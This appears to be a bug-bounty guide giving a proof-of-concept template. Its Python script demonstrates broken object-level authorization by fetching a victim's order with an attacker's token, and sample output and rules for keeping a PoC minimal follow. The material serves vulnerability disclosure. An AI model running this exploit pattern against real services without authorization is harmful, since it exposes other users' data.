# PoC template

A runnable proof-of-concept is the strongest evidence. Keep it minimal, take
credentials as arguments, and print exactly what proves the bug.

---

## Structure

```python
#!/usr/bin/env python3
"""BOLA on GET /api/orders/{id}.

usage: python poc.py <attacker_email> <attacker_pass> <victim_email> <victim_pass>

Requires two accounts on the program's test instance. Prints the victim's order
as returned to the attacker's session.
"""
import sys
import requests

BASE = "https://app.example.com"
S = requests.Session()


def login(email, password):
    r = S.post(f"{BASE}/api/login", json={"email": email, "password": password})
    r.raise_for_status()
    return r.json()["token"]


def create_order(token):
    r = requests.post(
        f"{BASE}/api/orders",
        headers={"Authorization": f"Bearer {token}"},
        json={"product": "sku-1", "qty": 1},
    )
    r.raise_for_status()
    return r.json()["id"]


def main():
    a_email, a_pass, b_email, b_pass = sys.argv[1:5]
    a_tok = login(a_email, a_pass)
    b_tok = login(b_email, b_pass)
    b_id = create_order(b_tok)
    print(f"[+] victim order id: {b_id}")

    r = requests.get(
        f"{BASE}/api/orders/{b_id}",
        headers={"Authorization": f"Bearer {a_tok}"},
    )
    print(f"[+] attacker GET /api/orders/{b_id} -> {r.status_code}")
    body = r.json()
    print(f"[+] returned owner: {body.get('user')}")
    assert body.get("user") == b_email, "not vulnerable: owner mismatch"
    print("[+] VULNERABLE: attacker received victim's order")


if __name__ == "__main__":
    main()
```

---

## Rules for a PoC

- Takes credentials as args; never hardcode real ones.
- Uses the smallest possible requests.
- Prints one clear line of proof.
- Does not mutate beyond a test object you own.
- Does not dump data.
- Exits non-zero on failure so a triager can tell.

---

## Output to include in the report

```
[+] victim order id: 1043
[+] attacker GET /api/orders/1043 -> 200
[+] returned owner: b@example.com
[+] VULNERABLE: attacker received victim's order
```
